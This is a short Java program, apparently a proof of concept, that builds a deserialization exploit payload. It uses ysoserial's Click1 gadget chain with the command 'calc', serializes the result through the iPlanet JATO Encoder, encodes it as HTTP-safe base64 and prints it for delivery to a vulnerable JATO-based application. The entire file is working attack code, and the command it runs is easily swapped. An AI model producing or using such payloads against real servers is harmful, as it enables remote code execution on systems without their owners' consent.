package com.test;

import com.iplanet.jato.util.Encoder;
import ysoserial.payloads.Click1;

import java.io.Serializable;

public class Main {

    public static void main(String[] args) {
        Click1 click1 = new Click1();
        try {
            Object calc = click1.getObject("calc");
            byte[] serialize = Encoder.serialize((Serializable) calc, false);
            String s = Encoder.encodeHttp64(serialize, 10000000);
            System.out.println(s);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
